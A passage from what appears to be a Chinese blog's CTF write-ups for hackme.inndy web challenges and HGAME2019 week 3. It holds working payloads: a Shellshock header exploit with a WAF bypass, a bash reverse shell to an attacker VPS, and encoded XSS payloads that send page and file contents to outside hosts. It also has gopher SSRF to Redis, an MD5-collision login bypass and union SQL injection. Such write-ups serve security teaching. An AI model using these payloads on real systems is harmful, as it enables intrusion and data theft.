class=\"line\">    [<span class=\"string\">'untar'</span>, <span class=\"string\">'Tar Tester'</span>],</span><br><span class=\"line\">    [<span class=\"string\">'cmd'</span>, <span class=\"string\">'Cmd Exec'</span>],</span><br><span class=\"line\">    [<span class=\"string\">'ls'</span>, <span class=\"string\">'List files'</span>],</span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">fuck</span><span class=\"params\">($msg)</span> </span>&#123;</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Type: text/plain'</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> $msg;</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$black_list = [</span><br><span class=\"line\">    <span class=\"string\">'\\/flag'</span>, <span class=\"string\">'\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;'</span></span><br><span class=\"line\">];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waf</span><span class=\"params\">($a)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $black_list;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(is_array($a)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($a <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span><br><span class=\"line\">            waf($key);</span><br><span class=\"line\">            waf($val);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($black_list <span class=\"keyword\">as</span> $b) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(preg_match(<span class=\"string\">\"/$b/\"</span>, $a) === <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">                fuck(<span class=\"string\">\"$b detected! exit now.\"</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">waf($_SERVER);</span><br><span class=\"line\">waf($_GET);</span><br><span class=\"line\">waf($_POST);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">execute</span><span class=\"params\">($cmd, $shell=<span class=\"string\">'bash'</span>)</span> </span>&#123;</span><br><span class=\"line\">    system(sprintf(<span class=\"string\">'%s -c %s'</span>, $shell, escapeshellarg($cmd)));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span>($_SERVER <span class=\"keyword\">as</span> $key =&gt; $val) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(substr($key, <span class=\"number\">0</span>, <span class=\"number\">5</span>) === <span class=\"string\">'HTTP_'</span>) &#123;</span><br><span class=\"line\">        putenv(<span class=\"string\">\"$key=$val\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$page = <span class=\"string\">''</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'func'</span>])) &#123;</span><br><span class=\"line\">    $page = $_GET[<span class=\"string\">'func'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($page, <span class=\"string\">'..'</span>) !== <span class=\"keyword\">false</span>) &#123;</span><br><span class=\"line\">        $page = <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>($page &amp;&amp; strlen($page) &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">include</span>(<span class=\"string\">\"$page.php\"</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>题目有一个putenv()敏感函数，百度可知存在一个2014年的一个重大漏洞 <code>CVE-2014-6271(破壳（shellsock）漏洞)</code> ，在freebuf中有一个链接</p>\n<blockquote>\n<p><a href=\"http://www.freebuf.com/articles/system/45390.html\" target=\"_blank\" rel=\"noopener\">http://www.freebuf.com/articles/system/45390.html</a></p>\n</blockquote>\n<p>国外有一个漏洞利用的文章，</p>\n<blockquote>\n<p><a href=\"https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php\" target=\"_blank\" rel=\"noopener\">https://security.stackexchange.com/questions/68325/shellshock-attack-scenario-exploiting-php</a></p>\n</blockquote>\n<p><img src=\"/2018/08/28/hackme/4.png\" alt=\"exp\"></p>\n<p>但是直接利用会被waf掉，所以我们要考虑绕过正则</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#39;\\(\\)\\s*\\&#123;\\s*:;\\s*\\&#125;;&#39;</span><br></pre></td></tr></table></figure>\n<p>题目的正则中 <code>:;</code> 是存在漏洞的，我们可以用 <code>: ;</code> 绕过，重试一下发现可以成功，我们可以开始执行shell命令，尝试访问flag，一波探测之后发现读取flag时遇到了又遇到了waf，这次是 <code>\\/flag</code> 我们可以利用通配符绕过，</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<p>但是并没有出现flag，发现是因为只有root才有文件的读权限</p>\n<p><img src=\"/2018/08/28/hackme/5.png\" alt></p>\n<p>但是题目中有一个flag-reader文件，我们尝试读取一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;cat ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;?lag-reader.c&quot; -q -O - &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">include &lt;unistd.h&gt;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;syscall.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">char</span> buff[<span class=\"number\">4096</span>], rnd[<span class=\"number\">16</span>], val[<span class=\"number\">16</span>];</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(syscall(SYS_getrandom, &amp;rnd, <span class=\"keyword\">sizeof</span>(rnd), <span class=\"number\">0</span>) != <span class=\"keyword\">sizeof</span>(rnd)) &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Not enough random\\n\"</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tsetuid(<span class=\"number\">1337</span>);</span><br><span class=\"line\">\tseteuid(<span class=\"number\">1337</span>);</span><br><span class=\"line\">\talarm(<span class=\"number\">1</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, &amp;rnd, <span class=\"keyword\">sizeof</span>(rnd));</span><br><span class=\"line\">\t<span class=\"built_in\">read</span>(<span class=\"number\">0</span>, &amp;val, <span class=\"keyword\">sizeof</span>(val));</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(<span class=\"built_in\">memcmp</span>(rnd, val, <span class=\"keyword\">sizeof</span>(rnd)) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> fd = <span class=\"built_in\">open</span>(argv[<span class=\"number\">1</span>], O_RDONLY);</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(fd &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">int</span> s = <span class=\"built_in\">read</span>(fd, buff, <span class=\"number\">1024</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span>(s &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, buff, s);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">close</span>(fd);</span><br><span class=\"line\">\t\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Can not open file\\n\"</span>, <span class=\"number\">18</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">write</span>(<span class=\"number\">1</span>, <span class=\"string\">\"Wrong response\\n\"</span>, <span class=\"number\">16</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码的大致意思就是要我们一秒内把它输出的内容在输入回去，即可以打出文件内容，但是以我们现在的交互方式显然太慢了，最好反弹一个shell</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget --header&#x3D;&quot;X-Exploit: () &#123; : ; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;your_vps_ip&#x2F;8888 0&gt;&amp;1&quot; -q -O -  &quot;https:&#x2F;&#x2F;command-executor.hackme.inndy.tw&#x2F;index.php?func&#x3D;cmd&amp;cmd&#x3D;env&quot;</span><br></pre></td></tr></table></figure>\n<p>又发现在/var/tmp目录是可写的，所以我们可以利用该目录来读flag</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag-reader flag &gt; /var/tmp/content &lt; /var/tmp/content</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat content</span><br></pre></td></tr></table></figure>\n<h1 id=\"xssme\"><a href=\"#xssme\" class=\"headerlink\" title=\"xssme\"></a>xssme</h1><p>先注册一个账号登录一下， 发现有一个send email功能，而题目又说xssme，猜测应该是存在xss漏洞，测试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert(&#39;123&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>\n<p>回显script标签和（被过滤了，尝试绕过，onerror等也都被过滤了，发现可以用svg/onload来做</p>\n<p><img src=\"/2018/08/28/hackme/7.png\" alt=\"payload\"></p>\n<p>然后在自己的ceve账号中收到回显</p>\n<p><img src=\"/2018/08/28/hackme/6.png\" alt=\"回显\"></p>\n<h1 id=\"xssrf-leak\"><a href=\"#xssrf-leak\" class=\"headerlink\" title=\"xssrf leak\"></a>xssrf leak</h1><p>上一题中有一个PHPSESSID，尝试用这个cookie访问一下，可以看到页面有回显</p>\n<blockquote>\n<p>Admin only allowed from localhost, but you came from 192.168.123.1</p>\n</blockquote>\n<p>修改了请求头也没有用，看了别人的思路我们可以利用xss来本地读取文件，看到了一个方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;document.location&#x3D;&#39;http:&#x2F;&#x2F;ov0eg5.ceye.io&#x2F;?&#39;+btoa(document.body.innerHTML)&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>但是遭到了过滤，我们可以考虑用HTML实体编码绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#111;&amp;#118;&amp;#48;&amp;#101;&amp;#103;&amp;#53;&amp;#46;&amp;#99;&amp;#101;&amp;#121;&amp;#101;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#98;&amp;#111;&amp;#100;&amp;#121;&amp;#46;&amp;#105;&amp;#110;&amp;#110;&amp;#101;&amp;#114;&amp;#72;&amp;#84;&amp;#77;&amp;#76;&amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>果然可以收到payload，base64解码一下再保存为html格式打开</p>\n<p><img src=\"/2018/08/28/hackme/8.png\" alt></p>\n<p>send request功能有个request.php，尝试读取该页面</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;GET&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.send();</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>编码一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#61;&amp;#110;&amp;#101;&amp;#119;&amp;#32;&amp;#88;&amp;#77;&amp;#76;&amp;#72;&amp;#116;&amp;#116;&amp;#112;&amp;#82;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#40;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#110;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#99;&amp;#104;&amp;#97;&amp;#110;&amp;#103;&amp;#101;&amp;#61;&amp;#102;&amp;#117;&amp;#110;&amp;#99;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#40;&amp;#41;&amp;#10;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#105;&amp;#102;&amp;#32;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#97;&amp;#100;&amp;#121;&amp;#83;&amp;#116;&amp;#97;&amp;#116;&amp;#101;&amp;#61;&amp;#61;&amp;#52;&amp;#32;&amp;#38;&amp;#38;&amp;#32;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#116;&amp;#97;&amp;#116;&amp;#117;&amp;#115;&amp;#61;&amp;#61;&amp;#50;&amp;#48;&amp;#48;&amp;#41;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#123;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#61;&#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#49;&amp;#51;&amp;#56;&amp;#46;&amp;#54;&amp;#56;&amp;#46;&amp;#50;&amp;#57;&amp;#46;&amp;#57;&amp;#50;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#51;&amp;#47;&amp;#63;&#39;&amp;#43;&amp;#98;&amp;#116;&amp;#111;&amp;#97;&amp;#40;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#114;&amp;#101;&amp;#115;&amp;#112;&amp;#111;&amp;#110;&amp;#115;&amp;#101;&amp;#84;&amp;#101;&amp;#120;&amp;#116;&amp;#41;&amp;#59;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;#125;&amp;#10;&amp;#125;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#111;&amp;#112;&amp;#101;&amp;#110;&amp;#40;&amp;#34;&amp;#71;&amp;#69;&amp;#84;&amp;#34;&amp;#44;&amp;#34;&amp;#114;&amp;#101;&amp;#113;&amp;#117;&amp;#101;&amp;#115;&amp;#116;&amp;#46;&amp;#112;&amp;#104;&amp;#112;&amp;#34;&amp;#44;&amp;#116;&amp;#114;&amp;#117;&amp;#101;&amp;#41;&amp;#59;&amp;#10;&amp;#120;&amp;#109;&amp;#108;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#46;&amp;#115;&amp;#101;&amp;#110;&amp;#100;&amp;#40;&amp;#41;&amp;#59;&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>然后在vps上即可收到base64字符串，解码</p>\n<p><img src=\"/2018/08/28/hackme/9.png\" alt></p>\n<p>这应该就是题目的利用位置，我们尝试读config.php文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class=\"line\">xmlhttp.send(&quot;url&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;config.php&quot;);</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>编码发送，果然可以收到flag</p>\n<p><img src=\"/2018/08/28/hackme/10.png\" alt=\"result\"></p>\n<h1 id=\"xssrf-redis\"><a href=\"#xssrf-redis\" class=\"headerlink\" title=\"xssrf redis\"></a>xssrf redis</h1><p>题目漏洞点在于gopher未授权访问</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;svg&#x2F;onload&#x3D;&quot;</span><br><span class=\"line\">xmlhttp&#x3D;new XMLHttpRequest();</span><br><span class=\"line\">xmlhttp.onreadystatechange&#x3D;function()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (xmlhttp.readyState&#x3D;&#x3D;4 &amp;&amp; xmlhttp.status&#x3D;&#x3D;200)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        document.location&#x3D;&#39;http:&#x2F;&#x2F;vps_ip:23333&#x2F;?&#39;+btoa(xmlhttp.responseText);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">xmlhttp.open(&quot;POST&quot;,&quot;request.php&quot;,true);</span><br><span class=\"line\">xmlhttp.setRequestHeader(&quot;Content-type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);</span><br><span class=\"line\">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_KEYS%2520*%250a_quit&quot;);</span><br><span class=\"line\">&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>发现有flag，读取之</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">xmlhttp.send(&quot;url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:25566&#x2F;_lrange%2520flag%25200%252053%250a_quit&quot;);</span><br></pre></td></tr></table></figure>\n<p>然后处理一下即可得到flag</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"HGAME2019-Web-Week3&4","url":"/2019/03/02/hgame2019b/","content":"<h1 id=\"week-3\"><a href=\"#week-3\" class=\"headerlink\" title=\"week-3\"></a>week-3</h1><a id=\"more\"></a>\n<h2 id=\"神奇的MD5\"><a href=\"#神奇的MD5\" class=\"headerlink\" title=\"神奇的MD5\"></a>神奇的MD5</h2><p>文件探测一下发现存在备份文件泄露<code>.login.php.swp</code>，核心代码如下<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">session_start();</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (@$_POST[<span class=\"string\">'username'</span>] <span class=\"keyword\">and</span> @$_POST[<span class=\"string\">'password'</span>] <span class=\"keyword\">and</span> @$_POST[<span class=\"string\">'code'</span>])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $username = (string)$_POST[<span class=\"string\">'username'</span>];</span><br><span class=\"line\">    $password = (string)$_POST[<span class=\"string\">'password'</span>];</span><br><span class=\"line\">    $code     = (string)$_POST[<span class=\"string\">'code'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (($username == $password ) <span class=\"keyword\">or</span> ($username == $code)  <span class=\"keyword\">or</span> ($password == $code)) &#123; </span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Your input can't be the same\"</span>;</span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ((md5($username) === md5($password)) <span class=\"keyword\">and</span> (md5($password) === md5($code)))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Good\"</span>; </span><br><span class=\"line\">    </span><br><span class=\"line\">        header(<span class=\"string\">'Location: admin.php'</span>);  </span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"&lt;pre&gt; Invalid password&lt;/pre&gt;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>可以看到我们只要生成三个文件内容不同但是MD5值相同的文件就可以了，搜索了一下发现了一篇文章<a href=\"https://xz.aliyun.com/t/3161\" target=\"_blank\" rel=\"noopener\">link</a>，有一个工具fastcoll就可以生成两个MD5值相同的不同文件</p>\n<ol>\n<li>先生成两个MD5值相同的文件<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastcoll_v1.0.0.5.exe -o test0 test1</span><br></pre></td></tr></table></figure></li>\n<li>然后根据test1再生成两个MD5值相同的文件，此时test00，test01的MD5值相同<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">fastcoll_v1.0.0.5.exe -p test1 -o test00 test01</span><br></pre></td></tr></table></figure></li>\n<li>将test00的最后128位写入文件a，（-c 128 表示最后128位，tail读文件是从后往前读的，这128位正是test1和test00MD5不同的原因），同理处理一下test01<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">tail -c 128 test00 &gt; a</span><br><span class=\"line\">tail -c 128 test01 &gt; b</span><br></pre></td></tr></table></figure></li>\n<li>执行type命令将test0和a的内容写进test10中，将test0和b的内容写入test11<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">type test0 a &gt; test10</span><br><span class=\"line\">type test1 b &gt; test11</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>于是就生成了test00，test01，test10，test11四个MD5值相同的文件，再用curl编码一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl --data-urlencode username@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test00 --data-urlencode password@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test01 --data-urlencode code@C:\\Users\\Snow\\Desktop\\fastcoll_v1.0.0.5.exe\\test10 http:&#x2F;&#x2F;118.25.89.91:8080&#x2F;question&#x2F;login.php -i</span><br></pre></td></tr></table></figure>\n<p>之后可以得到服务器返回的cookie<code>Set-Cookie: PHPSESSID=ff92dae820810170f60ef2a04f027a61; path=/</code>，写入admin.php页面中，发现是个shell终端，可以查看到admin.php源码，关键过滤如下<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$cmd = str_replace(<span class=\"string\">\"flag\"</span>,<span class=\"string\">'none'</span>,$cmd);</span><br></pre></td></tr></table></figure><br>绕过很简单，通配符与单引号都可以绕过</p>\n<p>payload：<code>cat /fl??</code> OR <code>cat /fl&#39;&#39;ag</code></p>\n<p>flag：<code>hgame{a1c83b66cc504d583c09ea6c20c0dabc}</code></p>\n<h2 id=\"sqli-1\"><a href=\"#sqli-1\" class=\"headerlink\" title=\"sqli-1\"></a>sqli-1</h2><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">substr(md5($_GET[<span class=\"string\">\"code\"</span>]),<span class=\"number\">0</span>,<span class=\"number\">4</span>) === <span class=\"number\">7229</span></span><br></pre></td></tr></table></figure>\n<p>题目需要验证码，可以爆破一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span>($i=<span class=\"number\">0</span>;$i&lt;<span class=\"number\">999999999</span>;$i++)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(substr(md5($i), <span class=\"number\">0</span>, <span class=\"number\">4</span>)===<span class=\"string\">'803a'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $i;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>然后就是常规的数字型注入了，注意每次都要更新一下code值</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code&#x3D;4446&amp;id&#x3D;1 order by 1--+</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code&#x3D;31226&amp;id&#x3D;-1 union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()--+</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>f1l1l1l1g,words </p>\n</blockquote>\n<p>不知道为什么表名不对，猜测可能是表名有什么问题，所以用16进制编码一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code&#x3D;70176&amp;id&#x3D;-1 union select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x66316c316c316c3167--+</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>f14444444g</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?code&#x3D;51097&amp;id&#x3D;-1 union select f14444444g from f1l1l1l1g--+</span><br></pre></td></tr></table></figure>\n<p>flag: <code>hgame{sql1_1s_iNterest1ng}</code></p>\n<h2 id=\"sqli-2\"><a href=\"#sqli-2\" class=\"headerlink\" 